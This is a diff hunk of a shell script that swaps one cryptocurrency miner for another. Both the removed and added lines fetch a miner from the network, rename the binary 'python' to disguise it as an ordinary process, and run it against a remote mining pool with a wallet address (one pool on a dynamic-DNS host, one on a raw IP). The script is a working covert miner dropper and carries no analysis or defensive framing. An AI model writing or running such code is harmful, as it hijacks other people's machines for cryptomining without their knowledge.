@@ -33,9 +33,9 @@
  exit
  fi
  
- wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
- unzip aquaminer-0.4-linux-amd64.zip
- mv aquaminer-0.4-linux-amd64 python
- ./python -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/3h
+ wget https://github.com/liaovanchuong/miner/blob/master/web.tar.gz
+ tar -zxvf web.tar.gz
+ mv webchain-miner python
+ ./python -o 171.249.186.43:5678 -u 0xdb5ecb909cb16b4dab4a3e1f79052418d696e18b -p x
  
  exit 0
